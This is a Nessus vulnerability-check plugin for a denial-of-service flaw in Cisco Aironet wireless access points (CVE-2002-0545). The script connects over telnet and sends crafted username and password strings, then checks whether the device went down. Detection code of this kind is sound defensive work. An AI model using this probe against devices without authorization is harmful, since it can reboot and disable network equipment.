#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11014);
 script_bugtraq_id(4461);
 script_cve_id("CVE-2002-0545");
 script_xref(name:"OSVDB", value:"5238");
 script_version ("$Revision: 1.15 $");
 
 script_name(english:"Cisco Aironet Telnet Invalid Username/Password DoS");
 script_summary(english:"Checks for CSCdw81244");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote wireless access point has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be a Cisco Aironet wireless access point.\n\n",
     "It was possible to reboot the AP by connecting via telnet and\n",
     "and providing a specially crafted username and password.  A remote\n",
     "attacker could do this repeatedly to disable the device."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.cisco.com/warp/public/707/Aironet-Telnet.shtml"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Update to release 11.21, or disable telnet."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"CISCO");
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/telnet", 23);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include('telnet_func.inc');

if (report_paranoia < 2) exit(0);

port=get_kb_item("Services/telnet");
if(!port)port=23;


# we don't use start_denial/end_denial because they
# might be too slow (the device takes a short time to reboot)

alive = tcp_ping(port:port);
if(alive)
{
 if(!get_port_state(port))exit(0);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 buf = telnet_negotiate(socket:soc);
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 close(soc);
 
 sleep(1);
 alive = tcp_ping(port:port);
 if(!alive)security_hole(port);
}


